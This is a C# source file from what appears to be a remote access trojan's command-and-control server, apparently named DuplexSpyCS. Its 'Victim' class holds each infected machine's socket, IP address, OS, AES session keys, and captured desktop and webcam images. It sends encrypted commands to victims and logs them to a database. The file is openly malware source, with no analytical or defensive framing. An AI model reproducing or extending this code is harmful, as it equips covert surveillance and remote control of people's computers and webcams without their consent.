﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using DuplexSpyCS;

public class Victim
{
    //SOCKET
    public Socket socket;
    public static int MAX_BUFFER_LENGTH = 65536;
    public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
    public string ID; //VICTIM ONLINE ID
    public string r_addr; //REMOTE IP ADDRESS
    public int r_port; //REMOTE PORT
    public bool unix_like; //VICTIM UNIX LIKE ?

    //LATENCY
    public DateTime last_sent;
    public int latency_time = 100;

    //CRYPTOGRAPHY
    public (string public_key, string private_key) key_pairs;
    public (byte[] key, byte[] iv) _AES;
    public string challenge_text;

    //STATUS
    public int _received_bytes = 0;
    public int ReceivedBytes { get { return _received_bytes; } }
    public int _sent_bytes = 0;
    public int SentBytes { get { return _sent_bytes; } }

    //FOLDER
    public string dir_victim;

    //OS
    public string remoteOS;

    //DESKTOP
    public Image img_LastDesktop;

    //WEBCAM
    public Image img_LastWebcam;

    public Victim(Socket socket)
    {
        if (socket == null)
        {
            MessageBox.Show("Socket is null.", "class Victim", MessageBoxButtons.OK, MessageBoxIcon.Error);
            C2.sql_conn.WriteErrorLogs(this, "Null socket");
            return;
        }

        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        this.socket = socket;
        r_addr = split[0];
        r_port = int.Parse(split[1]);
        ID = "[NOT YET]";
    }

    public void Send(int Command, int Param, string data)
    {
        Send(Command, Param, Encoding.UTF8.GetBytes(data));
    }
    public void Send(int Command, int Param, byte[] buffer)
    {
        if (buffer != null)
        {
            try
            {
                buffer = new DSP((byte)Command, (byte)Param, buffer).GetBytes();
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch (Exception ex)
                    {
                        C2.sql_conn.WriteErrorLogs(this, ex.Message);
                    }
                }), buffer);

                C2.sent_bytes += buffer.Length;
            }
            catch (Exception ex)
            {
                C2.sql_conn.WriteErrorLogs(this, ex.Message);
            }
        }
    }
    public void encSend(int Command, int Param, string data)
    {
        string enc_data = Crypto.AESEncrypt(data, _AES.key, _AES.iv);
        Send(Command, Param, enc_data);

        if (Command == 2 && Param != 1)
            C2.sql_conn.WriteSendLogs(this, $"{data.Split('|')[0]}");
    }
    public void SendCommand(string command)
    {
        encSend(2, 0, command);
    }

    public void Reconnect()
    {

    }

    public void Disconnect()
    {
        socket.Close();
    }
}
